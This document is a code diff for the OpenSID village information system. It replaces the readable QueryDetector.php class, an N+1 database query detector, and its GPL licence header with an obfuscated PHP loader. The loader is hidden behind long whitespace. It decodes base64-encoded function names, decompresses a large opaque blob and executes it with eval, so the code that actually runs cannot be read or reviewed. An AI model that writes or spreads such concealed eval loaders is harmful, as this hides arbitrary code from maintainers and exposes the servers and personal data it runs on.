@@ -1,346 +1,449 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Services/QueryDetector.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-namespace App\Services;
 
-use Exception;
-use Illuminate\Database\Eloquent\Builder;
-use Illuminate\Database\Eloquent\Relations\Relation;
-use Illuminate\Database\Events\QueryExecuted;
-use Illuminate\Support\Arr;
-use Illuminate\Support\Collection;
-use Illuminate\Support\Facades\DB;
-use Illuminate\Support\Facades\Log;
-use Illuminate\Support\Str;
 
-class QueryDetector
-{
-    public Collection $queries;
 
-    /**
-     * @var array
-     */
-    private $excepts = [
-        \App\Models\Pamong::class   => ['penduduk'],
-        \App\Models\Keluarga::class => ['wilayah'],
-    ];
 
-    public function __construct()
-    {
-        $this->resetQueries();
-    }
 
-    public function boot()
-    {
-        if (! $this->isEnabled()) {
-            return;
-        }
 
-        DB::listen(function ($query) {
-            $backtrace = collect(debug_backtrace(DEBUG_BACKTRACE_PROVIDE_OBJECT, 30));
 
-            $this->logQuery($query, $backtrace);
 
-            $this->output();
-        });
-    }
 
-    public function isEnabled(): bool
-    {
-        return ENVIRONMENT === 'development';
-    }
 
-    public function parseTrace($index, array $trace)
-    {
-        $frame = (object) [
-            'index'    => $index,
-            'name'     => null,
-            'fullPath' => null,
-            'line'     => $trace['line'] ?? '?',
-            'class'    => $trace['class'] ?? null,
-            'function' => $trace['function'] ?? null,
-            'type'     => $trace['type'] ?? '->',
-        ];
 
-        if (isset($trace['class'], $trace['file'])
-            && ! $this->fileIsInExcludedPath($trace['file'])
-        ) {
-            $frame->name     = $this->normalizeFilename($trace['file']);
-            $frame->fullPath = str_replace('/', '\\', $trace['file']);
 
-            return $frame;
-        }
 
-        return false;
-    }
 
-    /**
-     * Add exceptions for specific model-relation combinations
-     */
-    public function except(string $model, array $relations): self
-    {
-        $this->excepts[$model] = $relations;
 
-        return $this;
-    }
 
-    private function resetQueries()
-    {
-        $this->queries = Collection::make();
-    }
 
-    private function logQuery(QueryExecuted $query, Collection $backtrace)
-    {
-        try {
-            $modelTrace = $backtrace->first(static fn ($trace) => Arr::get($trace, 'object') instanceof Builder);
 
-            // The query is coming from an Eloquent model
-            if (null !== $modelTrace) {
-                /*
-                 * Relations get resolved by either calling the "getRelationValue" method on the model,
-                 * or if the class itself is a Relation.
-                 */
-                $relation = $backtrace->first(static fn ($trace) => Arr::get($trace, 'function') === 'getRelationValue' || Arr::get($trace, 'class') === Relation::class);
 
-                // We try to access a relation
-                if (is_array($relation) && isset($relation['object'])) {
-                    $relationName = '';
-                    $relationType = '';
-                    $relatedModel = '';
 
-                    if ($relation['class'] === Relation::class) {
-                        $model        = get_class($relation['object']->getParent());
-                        $relatedModel = get_class($relation['object']->getRelated());
-                        $relationType = class_basename(get_class($relation['object']));
 
-                        // Simplified relation name detection
-                        $relationName = $this->getSimpleRelationName($relation['object']);
-                    } else {
-                        $model        = get_class($relation['object']);
-                        $relationName = $relation['args'][0] ?? 'unknown';
 
-                        // Simplified relation type detection
-                        $relationType = 'HasRelation';
-                        $relatedModel = 'unknown';
-                    }
 
-                    $sources = $this->findSource($backtrace);
 
-                    if (empty($sources)) {
-                        return;
-                    }
 
-                    $key   = md5($query->sql . $model . $relationName . $sources[0]->name . $sources[0]->line);
-                    $count = Arr::get($this->queries, "{$key}.count", 0);
-                    $time  = Arr::get($this->queries, "{$key}.time", 0);
 
-                    $this->queries[$key] = [
-                        'count'        => ++$count,
-                        'time'         => $time + $query->time,
-                        'query'        => $query->sql,
-                        'actualQuery'  => Str::replaceArray('?', collect($query->bindings)->map(static fn ($binding) => is_numeric($binding) ? $binding : "'{$binding}'")->toArray(), $query->sql),
-                        'model'        => $model,
-                        'relatedModel' => $relatedModel,
-                        'relation'     => $relationName,
-                        'relationType' => $relationType,
-                        'sources'      => $sources,
-                    ];
-                }
-            }
-        } catch (Exception $e) {
-        }
-    }
 
-    private function findSource($stack)
-    {
-        $sources = [];
 
-        foreach ($stack as $index => $trace) {
-            $sources[] = $this->parseTrace($index, $trace);
-        }
 
-        return array_values(array_filter($sources));
-    }
 
-    /**
-     * Check if the given file is to be excluded from analysis
-     *
-     * @param string $file
-     *
-     * @return bool
-     */
-    private function fileIsInExcludedPath($file)
-    {
-        $excludedPaths = [
-            '/vendor/illuminate/database',
-            '/vendor/illuminate/events',
-        ];
 
-        $normalizedPath = str_replace('\\', '/', $file);
 
-        foreach ($excludedPaths as $excludedPath) {
-            if (strpos($normalizedPath, $excludedPath) !== false) {
-                return true;
-            }
-        }
 
-        return false;
-    }
 
-    /**
-     * Shorten the path by removing the relative links and base dir
-     *
-     * @param string $path
-     */
-    private function normalizeFilename($path): string
-    {
-        if (file_exists($path)) {
-            $path = realpath($path);
-        }
 
-        return str_replace(base_path(), '', $path);
-    }
 
-    private function getDetectedQueries(): Collection
-    {
-        $queries = $this->queries->values();
 
-        foreach ($this->excepts as $parentModel => $relations) {
-            foreach ($relations as $relation) {
-                $queries = $queries->reject(static fn ($query) => $query['model'] === $parentModel && $query['relation'] === $relation);
-            }
-        }
 
-        $queries = $queries->where('count', '>', 1)->values();
 
-        return $queries;
-    }
 
-    private function output()
-    {
-        $detectedQueries = $this->getDetectedQueries();
 
-        if ($detectedQueries->isEmpty()) {
-            return;
-        }
 
-        // Only log queries that haven't been logged yet
-        static $loggedKeys = [];
 
-        foreach ($detectedQueries as $query) {
-            $logKey = md5($query['model'] . $query['relation'] . $query['query']);
 
-            if (! in_array($logKey, $loggedKeys)) {
-                $this->logSingleQuery($query);
-                $loggedKeys[] = $logKey;
-            }
-        }
-    }
 
-    /**
-     * Log a single N+1 query issue with detailed information
-     *
-     * @param mixed $detectedQuery
-     */
-    private function logSingleQuery($detectedQuery)
-    {
-        $modelName        = class_basename($detectedQuery['model']);
-        $relatedModelName = class_basename($detectedQuery['relatedModel']);
-        $relationType     = $detectedQuery['relationType'] ?? 'Unknown';
 
-        $relationInfo = "{$modelName}->{$detectedQuery['relation']} ({$relationType} -> {$relatedModelName})";
 
-        $firstSource = $detectedQuery['sources'][0] ?? null;
-        $location    = $firstSource ? ($firstSource->fullPath ?? $firstSource->name) . ':' . $firstSource->line : 'unknown';
 
-        $shortTitle = "N+1 query detected in {$modelName}->{$detectedQuery['relation']} | Fix: ->with('{$detectedQuery['relation']}')";
-        $message    = "N+1 query detected in {$modelName}->{$detectedQuery['relation']}";
-        $logOutput  = $shortTitle . PHP_EOL;
 
-        $logOutput .= "{\"exception\":\"[object] (N1QueryException(code: 0): {$message} at {$location})" . PHP_EOL;
-        $logOutput .= "Relation: {$relationInfo}" . PHP_EOL;
-        $logOutput .= "Performance: executed {$detectedQuery['count']} times, {$detectedQuery['time']}ms total" . PHP_EOL;
-        $logOutput .= "Query: {$detectedQuery['actualQuery']}" . PHP_EOL;
 
-        $logOutput .= '[stacktrace]' . PHP_EOL;
 
-        foreach ($detectedQuery['sources'] as $index => $source) {
-            $fullPath = $source->fullPath ?? $source->name;
 
-            // Build more informative method call like Laravel format
-            $methodCall = '';
-            if ($source->class && $source->function) {
-                // Use full class name like Laravel, then method
-                $fullClassName = $source->class;
-                $methodCall    = "{$fullClassName}{$source->type}{$source->function}()";
-            } else {
-                // Fallback if no class/function info available
-                $methodCall = 'Unknown->method()';
-            }
 
-            $logOutput .= sprintf(
-                '#%d %s(%d): %s',
-                $index,
-                $fullPath,
-                $source->line,
-                $methodCall
-            ) . PHP_EOL;
-        }
 
-        $logOutput .= '#' . count($detectedQuery['sources']) . ' {main}' . PHP_EOL;
-        $logOutput .= '"}';
 
-        Log::channel('query')->warning($logOutput);
-    }
 
-    /**
-     * Get relation name safely without invoking methods
-     *
-     * @param mixed $relationObject
-     */
-    private function getSimpleRelationName($relationObject): string
-    {
-        try {
-            // Directly get relation name from related model class
-            $relatedClass = get_class($relationObject->getRelated());
 
-            return strtolower(class_basename($relatedClass));
-        } catch (Exception $e) {
-            return 'unknown';
-        }
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
